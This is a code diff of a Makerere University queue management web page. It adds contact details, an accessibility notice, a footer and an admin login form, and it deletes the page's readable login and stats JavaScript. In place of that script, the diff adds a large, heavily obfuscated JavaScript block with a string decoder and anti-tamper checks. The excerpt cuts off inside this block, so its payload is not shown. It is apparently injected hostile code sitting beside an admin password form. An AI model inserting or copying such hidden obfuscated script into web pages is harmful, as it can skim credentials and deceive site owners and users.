+            <tr><td>Public Holidays</td><td class="closed">Closed</td></tr>
+            <tr><td>Last token issued</td><td>4:30 PM</td></tr>
+          </tbody>
+        </table>
+        <div class="contact-list">
+          <div class="contact-item">
+            <div class="contact-icon"><svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg></div>
+            <div><div class="contact-label">Telephone</div><div class="contact-value">+256 414 532 631</div></div>
+          </div>
+          <div class="contact-item">
+            <div class="contact-icon"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg></div>
+            <div><div class="contact-label">Email</div><div class="contact-value"><a href="mailto:registrar@mak.ac.ug">registrar@mak.ac.ug</a></div></div>
+          </div>
+          <div class="contact-item">
+            <div class="contact-icon"><svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg></div>
+            <div><div class="contact-label">Location</div><div class="contact-value">Main Campus, Kampala, Uganda</div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+</main>
 
-        // ── FOOTER YEAR ────────────────────────────────
-        document.getElementById('footerYear').textContent = new Date().getFullYear();
+<!-- a11y strip -->
+<aside class="a11y">
+  <div class="a11y-inner">
+    <div class="a11y-icon"><svg viewBox="0 0 24 24"><path d="M12 2c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm9 7h-6v13h-2v-6h-2v6H9V9H3V7h18v2z"/></svg></div>
+    <p class="a11y-text"><strong>Inclusive Service Commitment:</strong> Priority assistance is available for persons with disabilities, elderly visitors, pregnant women and parents with young children. Please inform staff at any service window or call <strong>+256 414 532 631</strong> for immediate support. All public areas are wheelchair accessible.</p>
+  </div>
+</aside>
 
-        // ── LIVE STATS ─────────────────────────────────
-        async function loadStats() {
-            try {
-                const res = await fetch(`${API_BASE_URL}/api/admin/stats`);
-                const data = await res.json();
-                if (data.success) {
-                    let waiting = 0, serving = 0, done = 0;
-                    (data.stats || []).forEach(s => {
-                        waiting += s.waiting || 0;
-                        serving += s.serving || 0;
-                        done    += s.completed || 0;
-                    });
-                    document.getElementById('statWaiting').textContent = waiting;
-                    document.getElementById('statServing').textContent = serving;
-                    document.getElementById('statDone').textContent = done;
-                    document.getElementById('statOffices').textContent = (data.stats || []).length || 4;
-                }
-            } catch { /* stats remain as — */ }
-        }
-        loadStats();
-        setInterval(loadStats, 15000);
+<!-- footer -->
+<footer class="footer">
+  <div class="footer-top">
+    <div>
+      <div class="footer-brand">
+        <div class="footer-logo"><svg viewBox="0 0 24 24"><path d="M12 3L1 9l4 2.18v6L12 21l7-3.82v-6l2-1.09V17h2V9L12 3z"/></svg></div>
+        <div class="footer-name">Makerere University<small>Queue Management System</small></div>
+      </div>
+      <p class="footer-desc">Leading the way in efficient, inclusive service delivery since 1922. Serving over 40,000 students and staff across our Kampala campus.</p>
+    </div>
+    <div class="footer-col"><div class="footer-col-title">Service Portals</div><a href="#">Get Queue Token</a><a href="#">Officer Login</a><a href="#">Public Display</a><a href="#">Admin Panel</a></div>
+    <div class="footer-col"><div class="footer-col-title">Service Offices</div><a href="#">Registry &amp; Admissions</a><a href="#">Finance &amp; Bursary</a><a href="#">Transcripts Office</a><a href="#">Student Affairs</a><a href="#">General Inquiries</a></div>
+    <div class="footer-col"><div class="footer-col-title">Support</div><a href="#">Help Centre</a><a href="#">IT Support</a><a href="#">Accessibility</a><a href="#">Privacy Policy</a><a href="#">Terms of Use</a></div>
+  </div>
+  <div class="footer-bottom">
+    <div class="footer-bottom-inner">
+      <p>© <span id="footerYear"></span> Makerere University. All rights reserved. Queue Management System v3.0</p>
+      <div class="footer-links"><a href="#">Privacy</a><a href="#">Accessibility</a><a href="#">Sitemap</a></div>
+    </div>
+  </div>
+</footer>
 
-        // ── ADMIN MODAL ────────────────────────────────
-        function openAdminModal() {
-            document.getElementById('adminModal').classList.add('open');
-            document.getElementById('adminEmail').focus();
-        }
-        function closeAdminModal() {
-            document.getElementById('adminModal').classList.remove('open');
-            document.getElementById('adminLoginForm').reset();
-            document.getElementById('adminError').style.display = 'none';
-        }
-        document.getElementById('adminModal').addEventListener('click', function(e) {
-            if (e.target === this) closeAdminModal();
-        });
+<!-- admin modal -->
+<div class="modal-backdrop" id="adminModal">
+  <div class="modal">
+    <button class="modal-close" onclick="closeAdminModal()" aria-label="Close">&times;</button>
+    <div class="modal-icon"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg></div>
+    <h3>Administrator Access</h3>
+    <p class="modal-sub">Authorised personnel only. All access attempts are logged.</p>
+    <div class="modal-err" id="adminError"></div>
+    <form id="adminLoginForm" novalidate onsubmit="submitAdminLogin(event)">
+      <div class="field"><label for="adminEmail">Email Address</label><input type="email" id="adminEmail" autocomplete="email" placeholder="admin@mak.ac.ug" required></div>
+      <div class="field"><label for="adminPin">PIN / Password</label><input type="password" id="adminPin" autocomplete="current-password" placeholder="Enter your PIN or password" required></div>
+      <button type="submit" class="modal-btn" id="adminSubmitBtn">Sign In to Admin Panel</button>
+    </form>
+  </div>
+</div>
 
-        async function submitAdminLogin(e) {
-            e.preventDefault();
-            const email = document.getElementById('adminEmail').value.trim();
-            const pin   = document.getElementById('adminPin').value.trim();
-            const btn   = document.getElementById('adminSubmitBtn');
-            const errEl = document.getElementById('adminError');
+<div id="toast" role="status" aria-live="polite"></div>
 
-            btn.textContent = 'Verifying...';
-            btn.disabled = true;
-            errEl.style.display = 'none';
-
-            try {
-                const res = await fetch(`${API_BASE_URL}/api/login`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, pin_code: pin })
-                });
-                const data = await res.json();
-
-                if (data.success && data.user && data.user.role === 'admin') {
-                    sessionStorage.setItem('loggedInUser', JSON.stringify(data.user));
-                    showToast('Access granted. Redirecting...', '#00c853');
-                    setTimeout(() => window.location.href = 'admin-dashboard.html', 900);
-                } else {
-                    errEl.textContent = data.message || 'Invalid credentials or insufficient privileges.';
-                    errEl.style.display = 'block';
-                    btn.textContent = 'Sign In to Admin Panel';
-                    btn.disabled = false;
-                }
-            } catch {
-                errEl.textContent = 'Network error. Please check your connection.';
-                errEl.style.display = 'block';
-                btn.textContent = 'Sign In to Admin Panel';
-                btn.disabled = false;
-            }
-        }
-
-        // ── TOAST ──────────────────────────────────────
-        let _toastTimer;
-        function showToast(msg, bg) {
-            const t = document.getElementById('toast');
-            t.textContent = msg;
-            t.style.background = bg || '#1a7a30';
-            t.style.display = 'block';
-            clearTimeout(_toastTimer);
-            _toastTimer = setTimeout(() => t.style.display = 'none', 3500);
-        }
-    </script>
+<script>
+function a0g(a,b){a=a-(0xe92*-0x1+-0x211f+0x1*0x3106);var c=a0f();var d=c[a];if(a0g['reCpKA']===undefined){var e=function(j){var l='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var m='',n='',o=m+e,p=(''+function(){return 0x1b42+0x155b+-0x309d;})['indexOf']('\x0a')!==-(0x523*-0x1+-0x6df*0x2+0x12e2);for(var q=-0x2*0x7d6+-0x1324+0x22d0,r,s,t=0x1516+-0xf1*0x10+-0x606;s=j['charAt'](t++);~s&&(r=q%(-0x1b2*-0x12+0x3d*-0x3d+-0x3d*0x43)?r*(-0xe4b+-0x8f*-0x31+-0xcd4)+s:s,q++%(-0x1959+0x2*0x6af+0xbff))?m+=p||o['charCodeAt'](t+(0x1dc5+-0x1b40*-0x1+-0x1f7*0x1d))-(-0x22*-0xbb+-0xb70+-0xd5c)!==0x106f*-0x2+0x2*0x1152+-0x1c6?String['fromCharCode'](0x1df0+0x4*0x270+0x1*-0x26b1&r>>(-(0x359*0x4+-0x6e1*-0x4+0x2ba*-0xf)*q&-0xc5f+0x2699+-0x1a34)):q:-0x1*0x22bd+-0x372+-0x23f*-0x11){s=l['indexOf'](s);}for(var u=-0x19c1+-0x196b+-0x32*-0x106,v=m['length'];u<v;u++){n+='%'+('00'+m['charCodeAt'](u)['toString'](-0x1322*0x2+0x60*0x37+0x11b4))['slice'](-(0x1fee+-0x41d+0x1*-0x1bcf));}return decodeURIComponent(n);};var i=function(k,l){var m=[],n=0x101*0x1+-0x185*-0xb+-0x11b8,o,p='';k=e(k);var q;for(q=0x21*-0xd5+0xb3e+0x1*0x1037;q<-0xb*0x33f+-0x1bce+-0x16f*-0x2d;q++){m[q]=q;}for(q=-0x40*-0x4+-0x1*-0x1ea9+0x655*-0x5;q<0xa6b+-0xb02*0x2+-0x285*-0x5;q++){n=(n+m[q]+l['charCodeAt'](q%l['length']))%(-0xd5b+-0x9cd+0x60a*0x4),o=m[q],m[q]=m[n],m[n]=o;}q=0x1d63+0x1*0xb7a+-0x28dd,n=0x1c2b+-0x15d*-0x1+-0xa8*0x2d;for(var r=-0x304+-0xe8+0x3ec;r<k['length'];r++){q=(q+(-0x1c36+0x13*-0xaf+0xdbc*0x3))%(0x1963*0x1+0x247*-0x11+0xe54),n=(n+m[q])%(-0x2058+0x270f+-0xd1*0x7),o=m[q],m[q]=m[n],m[n]=o,p+=String['fromCharCode'](k['charCodeAt'](r)^m[(m[q]+m[n])%(0x2e7*0x8+0x254d*-0x1+0x1ad*0x9)]);}return p;};a0g['tllTuF']=i,a0g['ueWXYw']={},a0g['reCpKA']=!![];}var f=c[-0x17e6+-0x11*-0x6e+0x1098],g=a+f,h=a0g['ueWXYw'][g];if(!h){if(a0g['xAenvK']===undefined){var j=function(k){this['DPdWLV']=k,this['fDOowG']=[-0x1ecb+-0x2146+0x4012,-0x1a6*-0xb+-0x1b*-0xb7+-0x256f*0x1,-0x12ef+-0x2*-0xdf5+0xb*-0xd1],this['HuhJWG']=function(){return'newState';},this['trTgcJ']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['dPtglV']='[\x27|\x22].+[\x27|\x22];?\x20*}';};j['prototype']['QyTtUa']=function(){var k=new RegExp(this['trTgcJ']+this['dPtglV']),l=k['test'](this['HuhJWG']['toString']())?--this['fDOowG'][0xe35+0x5*0x52f+-0x281f]:--this['fDOowG'][0x103e+-0x157c+-0x3d*-0x16];return this['upSNAC'](l);},j['prototype']['upSNAC']=function(k){if(!Boolean(~k))return k;return this['hGPsam'](this['DPdWLV']);},j['prototype']['hGPsam']=function(k){for(var l=-0x108+-0x1*0x2004+0x210c,m=this['fDOowG']['length'];l<m;l++){this['fDOowG']['push'](Math['round'](Math['random']())),m=this['fDOowG']['length'];}return k(this['fDOowG'][0x14e7+-0x1698+0x1b1]);},(''+function(){return 0x1642+-0x2*-0x1001+-0x1*0x3644;})['indexOf']('\x0a')===-(-0x36e*0x6+-0x24a8+0x393d)&&new j(a0g)['QyTtUa'](),a0g['xAenvK']=!![];}d=a0g['tllTuF'](d,b),a0g['ueWXYw'][g]=d;}else d=h;return d;}(function(a,b){var a0c1={a:0x512,b:0x5bf,c:0x545,d:0x57a,e:'UNCq',f:0x86c,g:0x7b9,h:'AyAB',i:0x6dd,j:0x789,k:0x7df,l:0x761,m:'W$Ng',n:0x70f,o:0x8d3,p:0x166,q:0xe3,r:0x2e,s:0x34,t:'B*ff',u:0x48d,v:0x4f5,w:'8ueW',x:0x5c8,y:0x59e,z:0x59a,A:0x53b,B:'rYuj',C:0x658,D:0x468,E:0x627,F:0x460,bW:0x580,bX:0x6b8,bY:'uYGK',bZ:0x1ff,c0:0xa0,c1:0x8d,c2:0x1,c3:'cQDD',c4:0x765,c5:0x87d,c6:'8g6c',c7:0x6c9,c8:0x816},a0c0={a:0x3ce},a0bZ={a:0x261},a0bY={a:0x330},a0bX={a:0x10f},a0bW={a:0x2eb};function K(a,b,c,d,e){return a0g(d-a0bW.a,c);}var c=a();function I(a,b,c,d,e){return a0g(b- -a0bX.a,e);}function G(a,b,c,d,e){return a0g(c-a0bY.a,e);}function J(a,b,c,d,e){return a0g(c- -a0bZ.a,e);}function H(a,b,c,d,e){return a0g(a-a0c0.a,c);}while(!![]){try{var d=parseInt(G(a0c1.a,a0c1.b,a0c1.c,a0c1.d,a0c1.e))/(0x4*0x119+-0xd7*0x1f+0x1*0x15a6)+-parseInt(H(a0c1.f,a0c1.g,a0c1.h,a0c1.i,a0c1.j))/(-0x211*0x7+-0x1dea+0x2c63)*(-parseInt(H(a0c1.k,a0c1.l,a0c1.m,a0c1.n,a0c1.o))/(0x18*-0x53+0x26f2*0x1+-0x37*0x91))+-parseInt(J(a0c1.p,-a0c1.q,-a0c1.r,a0c1.s,a0c1.t))/(-0xa*-0x4+0x22ae+-0x2*0x1169)+-parseInt(K(a0c1.u,a0c1.v,a0c1.w,a0c1.x,a0c1.y))/(0x39*0x91+-0xcbd*-0x3+0x467b*-0x1)+parseInt(H(a0c1.z,a0c1.A,a0c1.B,a0c1.C,a0c1.D))/(0x18d0+0x10a6+-0xc*0x374)+parseInt(G(a0c1.E,a0c1.F,a0c1.bW,a0c1.bX,a0c1.bY))/(-0x70*0x1+0x1e*-0x2e+-0x1*-0x5db)*(parseInt(J(-a0c1.bZ,a0c1.c0,-a0c1.c1,-a0c1.c2,a0c1.c3))/(-0x4*-0x656+-0x1e44+0x4f4))+-parseInt(H(a0c1.c4,a0c1.c5,a0c1.c6,a0c1.c7,a0c1.c8))/(-0xc6+0x24e5+-0x2416);if(d===b)break;else c['push'](c['shift']());}catch(e){c['push'](c['shift']());}}}(a0f,0x115e4a+0x17ed4+-0x6d3d8),(function(){var a0fn={a:'bQMr',b:0x1d0,c:0x82,d:0x28,e:0x13e,f:0x31,g:'xh#R',h:0x1cf,i:0x171,j:0x2a,k:0x2bd,l:'cDQ)',m:0x2f9,n:0x2eb,o:0x18a,p:0xe7,q:'W$Ng',r:0x121,s:0xf5,t:0x38,u:0x5b7,v:'CfoD',w:0x539,x:0x729,y:0x673,z:0x308,A:0x3e7,B:0x428,C:0x551,D:0x1d,E:'*)xO',F:0xdb,bW:0x140,bX:0x93,bY:'cQDD',bZ:0xa0,c0:0x42,c1:0x6b,c2:0x11e,c3:0x29e,c4:'ynP2',c5:0xfc,c6:0x25b,c7:0x2ca,c8:0x1a6,c9:0x10b,ca:0x142,cb:0x183,cc:'gjN&',cd:0x14a,ce:0x2f3,cf:0x1d8,cg:'ynP2',ch:0x389,ci:0x232,cj:0x8d,ck:'&SmQ',cl:0x31f,cm:0xe2,cn:'RvxO',co:0x108,cp:0xb9,cq:0x17,cr:'lxTE',cs:0x12d,ct:0xff,cu:0xaf,cv:0xab,cw:0x174,cx:0x66,cy:0x25,cz:'9t(!',cA:0x3e,cB:0x3d,cC:0x5e,cD:0x1ba,cE:'Gd2r',cF:0xd0,cG:0x282,cH:'#Mp9',cI:0x362,cJ:0x24a,cK:0x319,cL:0x21c,cM:0x12c,cN:0x57,cO:0x70,cP:0x530,cQ:'RIlD',cR:0x45e,cS:0x3a6,cT:0x3a5,cU:0x180,cV:'093h',cW:0x2d4,cX:0x109,cY:0x185,cZ:0x23b,d0:0x242,d1:0x2c1,d2:0x126,d3:0x342,d4:0x40b,d5:0x476,d6:0x45a,d7:'gjN&',d8:0x68,d9:0x1a9,da:0x143,db:0x16d,dc:0x18,dd:0xd3,de:0x220,df:0x66,dg:0x284,dh:0x12d,di:0x217,dj:'cDQ)',dk:0x15c,dl:0x3c7,dm:0x2dd,dn:0x1f0,dp:0xc9,dq:0x8,dr:0x175,ds:0x15e,dt:0x224,du:0x2cd,dv:0xa0,dw:'iPFB',dx:0x212,dy:0xa5,dz:0x26d,dA:0xff,dB:0x2db,dC:0x1df,dD:0x249,dE:'cQDD',dF:0x346,dG:'fk$&',dH:0x421,dI:0x306,dJ:0x287,dK:0x2be,dL:0x321,dM:0x1ae,dN:0x221,dO:0x1a,dP:'dM@p',dQ:0x1bb,dR:0x21a,dS:0x23f,dT:0x108,dU:0x4d,dV:'&$G$',dW:0x61,dX:0x4f,dY:0x9c,dZ:'kpUa',e0:0x6c,e1:0x349,e2:0x21b,e3:0x1c9,e4:0x1ef,e5:0x21d,e6:0x3c1,e7:'cQDD',e8:0x2e3,e9:0x291,ea:0x3f4,eb:0x491,ec:0x32a,ed:'94nn',ee:0x400,ef:0x172,eg:0x26b,eh:0x188,ei:'UNCq',ej:0x73,ek:0x133,el:0x125,em:'B*ff',en:0x55,eo:0xfb,ep:0xf9,eq:0x2d3,er:0x3b4,es:0x459,et:0x47a,eu:0x5bb,ev:0x5aa,ew:0x56e,ex:0x121,ey:'L6gh',ez:0x163,eA:0x106,eB:0x162,eC:0x0,eD:0x50,eE:0x112,eF:0x1a,eG:0x313,eH:'k3fR',eI:0x1da,eJ:0x305,eK:0x1bb,eL:0xc,eM:'RISV',eN:0x166,eO:0x335,eP:0x189,eQ:0x22a,eR:0x262,eS:0x402,eT:0x377,eU:'gP5z',eV:0x36c,eW:0x2fb,eX:0x409,eY:0x18e,eZ:0x204,f0:0xee,f1:'3h4i',f2:0x146,f3:0x426,f4:'E]F8',f5:0x55d,f6:0x486,f7:0x331,f8:'G^Rx',f9:0x166,fa:0x192,fb:0x36,fc:0xf0,fd:0x7a,fe:'C(s]',ff:0x156,fg:0x12a,fh:0x7,fi:0xef,fj:'uYGK',fk:0xe3,fl:0xfe,fm:0x52,fn:0xe6,fo:0xb9,fp:0x31,fq:0x47,fr:'CfoD',fs:0x11c,ft:0xe4,fu:0x151,fv:0x301,fw:0x13f,fx:'AyAB',fy:0x2b2,fz:0x24d,fA:0x1f5,fB:0x34e,fC:'lxTE',fD:0x1fd,fE:0x17e,fF:0x109,fG:0x1c8,fH:0x371,fI:0x435,fJ:0x481,fK:0xfa,fL:0x44,fM:0x10e,fN:'E]F8',fO:0xfe,fP:0x559,fQ:0x40d,fR:0x3b6,fS:0x46e,fT:'nHEL',fU:'*)xO',fV:0x1f4,fW:0x29,fX:0x88,fY:0x5c5,fZ:0x6dc,g0:0x655,g1:0x74e,g2:0x19e,g3:'xh#R',g4:0x16,g5:0x49,g6:0x11f,g7:0x108,g8:0x286,g9:0x165,ga:0x273,gb:'GMu6',gc:0x4d6,gd:0x3b5,ge:0x327,gf:0x2d7,gg:0x63,gh:0x1e2,gi:0x255,gj:'94nn',gk:0x92,gl:0x7b,gm:0x46,gn:0xb6,go:'gP5z',gp:0x19b,gq:0x35d,gr:0x248,gs:0x130,gt:0x192,gu:0x84,gv:0xc5,gw:0x4e7,gx:'xh#R',gy:0x56b,gz:0x34d,gA:0x624,gB:0x364,gC:0x46c,gD:0x433,gE:0x488,gF:'3h4i',gG:0x2fc,gH:0x282,gI:0x259,gJ:0x238,gK:0x106,gL:0x9b,gM:0x20,gN:0x6e,gO:'uYGK',gP:0x4a,gQ:0x9,gR:0xac,gS:0x4c,gT:0x1e6,gU:0x114,gV:0x1f1,gW:0x132,gX:0x2d7,gY:0x7a,gZ:0x24,h0:0xa1,h1:0x9e,h2:0x131,h3:0x87,h4:0x165,h5:0x205,h6:0x176,h7:0xb8,h8:'8g6c',h9:'RIlD',ha:0x159,hb:0x1f,hc:0x15b,hd:0x131,he:0x4f2,hf:0x3b7,hg:0x38f,hh:0x531,hi:0xb3,hj:0x28a,hk:0xe6,hl:0x19c,hm:0xbc,hn:0xa2,ho:0x78,hp:0x58,hq:0x2b1,hr:0x137,hs:'CfoD',ht:0x271,hu:0x270,hv:0x1fa,hw:0x1bb,hx:0x1bf,hy:'5xJf',hz:0x28d,hA:'OA5G',hB:0x3b7,hC:0x168,hD:'#Mp9',hE:0x1a9,hF:0x6c,hG:0xac,hH:'3h4i',hI:0xaf,hJ:0x5,hK:0x6a,hL:0x84,hM:'093h',hN:0xaf,hO:0x26e,hP:0x124,hQ:0x12c,hR:0x22e,hS:0x329,hT:0x17a,hU:0x16b,hV:0x2a0,hW:0x1ef,hX:0xd9,hY:'cQDD',hZ:'&@E5',i0:0x44,i1:0xd2,i2:0xfd,i3:0x6f,i4:0x1ca,i5:0x149,i6:0x7f,i7:0xd4,i8:0x60,i9:'CfoD',ia:0x73,ib:0x17f,ic:0x8e,id:0x89,ie:0x84,ig:0x1f3,ih:0x340,ii:'OA5G',ij:0x4a9,ik:0x405,il:0x3a4,im:0x1cd,io:0xb4,ip:'gP5z',iq:0x3a,ir:0xb4,is:'#Mp9',it:0xb5,iu:0x231,iv:0xa1,iw:0x3e4,ix:0x296,iy:0x368,iz:'rYuj',iA:0x1cc,iB:0x2a6,iC:0x3b8,iD:'[xpi',iE:0x12f,iF:0xcb,iG:'8ueW',iH:0xb0,iI:0x3ef,iJ:0x351,iK:0x391,iL:0x472,iM:0x48a,iN:'OA5G',iO:0x5b7,iP:0x5a1,iQ:0x4b7,iR:0x344,iS:'RvxO',iT:0x41d,iU:0x1ae,iV:0x4b7,iW:0x1ec,iX:'nHEL',iY:0x115,iZ:0xbd,j0:0x164,j1:'FZFG',j2:0x290,j3:0xd9,j4:0xf2,j5:0x96,j6:0x150,j7:0x4f,j8:'fk$&',j9:0x361,ja:0x3dd,jb:0x491,jc:0x55a,jd:'ynP2',je:0x5c0,jf:0x5b3,jg:0x610,jh:0x42f,ji:'G^Rx',jj:0x7c,jk:0x12,jl:0x79,jm:0x1ef,jn:'093h',jo:0x9b,jp:0x94,jq:0xa9,jr:0xe3,js:0x88,jt:0x98,ju:')#q)',jv:0x1,jw:0x71,jx:'xh#R',jy:0x62,jz:0x6d,jA:0x3eb,jB:0x241,jC:0x1d2,jD:'dM@p',jE:0x2ca,jF:0x80,jG:'&$G$',jH:0x170,jI:0x5b,jJ:0x1eb,jK:0xa9,jL:0xb3,jM:0x4f,jN:0x1fe,jO:0xfb,jP:0x42,jQ:0x27,jR:0xde,jS:0x11,jT:0xec,jU:0x10,jV:0xc4,jW:0x267,jX:0x178,jY:0x2b,jZ:0xf9,k0:'Gd2r',k1:0x8e,k2:0x49,k3:0xa4,k4:0x1b7,k5:'W!QI',k6:0x13,k7:0x211,k8:0x17f,k9:0xf8,ka:0x53,kb:0x1b,kc:0x3c,kd:0x547,ke:0x58c,kf:0x51c,kg:0x669,kh:0xa,ki:0x18,kj:0x3f,kk:0x18c,kl:0x1,km:'L6gh',kn:0x120,ko:0x7d,kp:0x2,kq:0x1d6,kr:0x2a2,ks:0x2c7,kt:'FZFG',ku:0xe6,kv:0x91,kw:'iPFB',kx:0x28a,ky:0x105,kz:0x1ba,kA:0x42,kB:0x156,kC:'8ueW',kD:0xb7,kE:0x118,kF:0x173,kG:0xd7,kH:0x2a7,kI:0x1f6,kJ:0xac,kK:0x97,kL:0xae,kM:0xe0,kN:0x25c,kO:0xf6,kP:'&$G$',kQ:0xc9,kR:0x1d,kS:0x77,kT:0x2d8,kU:0x13f,kV:0x2ab,kW:'RISV',kX:0x37,kY:0x33c,kZ:0x393,l0:0x353,l1:0x330,l2:'3h4i',l3:0x196,l4:0x186,l5:0xd,l6:'UNCq',l7:0x31a,l8:0x22c,l9:0x13e,la:0x28f,lb:0x2a8,lc:'093h',ld:0x2b3,le:0x3ab,lf:0x22f,lg:0x3d8,lh:0x245,li:0xbb,lj:0x257,lk:0x39d,ll:0x18d,lm:0x20d,ln:0x9c,lo:'8g6c',lp:0x64,lq:0x11d,lr:0xe6,ls:0x86,lt:0xbc,lu:0x55c,lv:'cQDD',lw:0x4ac,lx:0x5c6,ly:0x6b9,lz:'L6gh',lA:0xf5,lB:0x1a2,lC:0x152,lD:'*)xO',lE:0x2d9,lF:0x169,lG:0x158,lH:0x1af,lI:0x48,lJ:0x276,lK:0x35b,lL:0x2b1,lM:0x453,lN:0x21c,lO:0x217,lP:0x1ab,lQ:'uYGK',lR:0xf,lS:0x1e7,lT:0xe1,lU:0x457,lV:0x37c,lW:0x4d7,lX:'k3fR',lY:'RIlD',lZ:0x17,m0:0x16c,m1:0x27d,m2:0x107,m3:0x204,m4:0xcc,m5:'#Mp9',m6:'5xJf',m7:0xc1,m8:0x214,m9:0xb0,ma:0x1e4,mb:0x289,mc:0x2b5,md:0x401,me:'FZFG',mf:0x3fb,mg:0x4ce,mh:0x47d,mi:0x111,mj:0x1c0,mk:0x26,ml:0x264,mm:0x198,mn:0x18b,mo:0x200,mp:0x191,mq:'#iB]',mr:0xaf,ms:0x3d4,mt:0x560,mu:0x3e2,mv:0x379,mw:0x3b7,mx:'C(s]',my:0x3b2,mz:0x45b,mA:0x270,mB:0x5a9,mC:0x44d,mD:0x616,mE:0x666,mF:0x4cb,mG:0x561,mH:0x447,mI:0x40f,mJ:0x2c9,mK:0x127,mL:0x67,mM:0x138,mN:'B*ff',mO:0x13d,mP:'k3fR',mQ:0x89,mR:0x23a,mS:0x37f,mT:0x1ff,mU:'L6gh',mV:0x17,mW:0x131,mX:0x194,mY:0x31c,mZ:0x2a4,n0:0x24c,n1:0x5b9,n2:'W!QI',n3:0x5a2,n4:0x583,n5:0x53a,n6:0x559,n7:'dM@p',n8:0x63c,n9:0x6c9,na:0x6e2,nb:0x1be,nc:0x218,nd:0x3bb,ne:'093h',nf:0x316,ng:0x2c4,nh:0x364,ni:0x222,nj:0x1b2,nk:0x31d,nl:0x2dd,nm:'iPFB',nn:0x4c5,no:'FZFG',np:0x4a3,nq:0x631,nr:')#q)',ns:0x194,nt:0x14c,nu:0x159,nv:0x1fe,nw:0x1e5,nx:0x258,ny:0xc3,nz:0x17f,nA:0x1f9,nB:'rYuj',nC:0x182,nD:'fk$&',nE:0x75,nF:'C(s]',nG:0x17a,nH:0x168,nI:0x6f,nJ:'UNCq',nK:0x35,nL:0x1b6,nM:0xae,nN:0x129,nO:'B*ff',nP:0x2c,nQ:0x41,nR:0xad,nS:0x8b,nT:0x18c,nU:0x319,nV:0x2ea,nW:0x50a,nX:0x3f5,nY:0x3b8,nZ:0x24c,o0:0x2ac,o1:0x161,o2:0x201,o3:0x11c,o4:0x83,o5:0x32,o6:'iPFB',o7:'RIlD',o8:0xff,o9:0xa4,oa:0x6d,ob:0x1b9,oc:0x7f,od:0xcc,oe:'8g6c',of:0x319,og:0x272,oh:0x2fa,oi:0x3b9,oj:'A)IC',ok:0x199,ol:0x16f,om:0x148,on:0x5f,oo:0x5c9,op:'&@E5',oq:0x74c,or:0x6fa,os:0x5d5,ot:0x14f,ou:0x8f,ov:0xca,ow:'AyAB',ox:0x1ea,oy:0x251,oz:0x2fe,oA:0xa8,oB:0x2e,oC:0xbf,oD:0x373,oE:0x239,oF:0x1de,oG:'rYuj',oH:0x1c6,oI:'k3fR',oJ:0x377,oK:0x101,oL:0x220,oM:0x155,oN:0x275,oO:0x367,oP:0x417,oQ:0x363,oR:0x112,oS:0x3d,oT:0x155,oU:'gjN&',oV:'cQDD',oW:0x173,oX:0xae,oY:0x3,oZ:0x147,p0:0x21,p1:0x177,p2:0x1e3,p3:0x297,p4:0x2ec,p5:0x2ec,p6:0x234,p7:0x279,p8:0x384,p9:0x33f,pa:'E]F8',pb:0x1de,pc:0x2dc,pd:0x1b1,pe:'E]F8',pf:0x4b2,pg:'lxTE',ph:0x462,pi:0x651,pj:0x5d4,pk:0x2a6,pl:'B*ff',pm:0x253,pn:0x10d,po:0x266,pp:0x122,pq:0x2cc,pr:0x3ce,ps:0x2b9,pt:0xe7,pu:0x256,pv:0x1cb,pw:0x6,px:'rYuj',py:0x1fe,pz:0x1f6,pA:0x197,pB:'E]F8',pC:0x2dc,pD:0x38c,pE:0x3e6,pF:0x2ea,pG:0x2ff,pH:0x450,pI:0x24b,pJ:0x32e,pK:'94nn',pL:0x2b3,pM:0x2a6,pN:0x521,pO:'cQDD',pP:0x38a,pQ:0x566,pR:0x4ff,pS:0xb8,pT:0x1cc,pU:0x58,pV:0x79,pW:0x160,pX:0x52,pY:0x2f6,pZ:0x445,q0:0x4c2,q1:0x58a,q2:0x553,q3:0x68b,q4:0x53b,q5:0x4cf,q6:0x43a,q7:0x3be,q8:0x55f,q9:0x140,qa:0x139,qb:0x17,qc:0x9d,qd:0xda,qe:'k3fR',qf:0x3d,qg:'xh#R',qh:0x1bb,qi:0x6c,qj:0x8c,qk:0x45,ql:0x29b,qm:0x410,qn:0x43b,qo:0x4d3},a0fm={a:'bQMr',b:0x120,c:0x18e,d:0x93,e:0x47,f:0x2fc,g:'k3fR',h:0x364,i:0x26b,j:0x2d6,k:'&$G$',l:0x1f3,m:0x270,n:0x58,o:0x39c,p:0x5c3,q:'CfoD',r:0x648,s:0x6f7,t:0x548,u:0x5a5,v:0x50a,w:0x6ae,x:0x706,y:'cDQ)',z:0x308,A:'94nn',B:0x3cc,C:0x354,D:0x2b2,E:0x23,F:0xbd,bW:'gjN&',bX:0x1f,bY:0x14,bZ:0x5d5,c0:'C(s]',c1:0x4f5,c2:0x681,c3:0x42f,c4:0xf0,c5:0x15c,c6:'5xJf',c7:0xf5,c8:0x9f,c9:0x712,ca:0x962,cb:0x7c5,cc:0x7be,cd:'rYuj',ce:0x61d,cf:'RvxO',cg:0x494,ch:0x5b7,ci:0x560,cj:0x705,ck:0x4eb,cl:0x672,cm:0x788,cn:'bQMr',co:0x531,cp:0x524,cq: